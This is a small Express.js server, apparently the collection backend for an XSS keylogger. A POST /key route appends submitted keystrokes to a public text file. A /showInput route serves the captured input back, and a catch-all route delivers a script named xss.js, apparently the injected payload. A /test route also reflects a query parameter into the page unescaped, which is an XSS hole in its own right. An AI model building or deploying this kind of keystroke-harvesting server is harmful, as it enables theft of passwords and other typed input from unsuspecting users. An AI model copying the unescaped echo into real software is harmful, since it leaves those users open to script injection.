const express = require('express');
const path = require('path');
const app = express();
const fs = require('fs');

// Middleware
app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/showInput', (req, res) => {
    res.sendFile(path.join(__dirname, './public', 'txt/input.txt'));
});

app.get('/test', (req, res) => {
    const { name } = req.query;
    res.send(`Hello ${name}`);
});

app.post('/key', (req, res) => {
    const { key } = req.body;
    fs.appendFileSync(path.join(__dirname, './public', 'txt/input.txt'), key);
    console.log(key);
});

app.get('*' , (req, res) => {
    res.sendFile(path.join(__dirname, './public', 'js/xss.js'));
});

app.listen(3003, () => {
    console.log('Serveur démarré sur http://localhost:3003');
});